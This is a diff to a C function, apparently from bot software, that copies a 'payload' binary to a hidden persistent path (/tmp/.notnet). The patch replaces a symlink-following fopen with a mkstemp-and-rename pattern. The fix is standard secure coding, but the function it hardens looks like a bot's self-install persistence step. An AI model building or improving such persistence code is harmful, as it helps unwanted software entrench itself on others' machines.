@@ -688,12 +688,28 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
     get_persist_path(dest, sizeof(dest));
 
     if (strcmp(bin_path, dest) != 0) {
+        /* SECURITY FIX (#341): never fopen(dest,"wb") — it follows
+         * symlinks (CWE-59). A local user pre-creating /tmp/.notnet as
+         * a symlink to a root-writable target got that file truncated
+         * by the copy below, then chmod 0755'd. Instead write to an
+         * unpredictable mkstemp name in the SAME directory as dest
+         * (same filesystem, so rename(2) stays atomic), then rename
+         * over dest — rename replaces a pre-existing symlink itself
+         * instead of following it. Mirrors payload_update() (#13). */
+        char tmp_path[512];
+        snprintf(tmp_path, sizeof(tmp_path), "%s.tmp.XXXXXX", dest);
+        int tfd = mkstemp(tmp_path);
+        if (tfd < 0) {
+            log_error("payload_install: mkstemp failed: %s", strerror(errno));
+            return -1;
+        }
+        FILE *dst = fdopen(tfd, "wb");
         FILE *src = fopen(bin_path, "rb");
-        FILE *dst = fopen(dest, "wb");
         if (!src || !dst) {
             log_error("Failed to copy payload");
             if (src) fclose(src);
             if (dst) fclose(dst);
+            unlink(tmp_path);
             return -1;
         }
 
@@ -702,9 +718,16 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
         while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
             fwrite(buf, 1, n, dst);
         }
+        int werr = ferror(dst);
 
         fclose(src);
         fclose(dst);
+        if (werr || rename(tmp_path, dest) != 0) {
+            log_error("payload_install: failed to install %s: %s",
+                      dest, strerror(errno));
+            unlink(tmp_path);
+            return -1;
+        }
     } else {
         log_info("payload_install: %s already at persistent path, skipping self-copy (#108)", dest);
     }
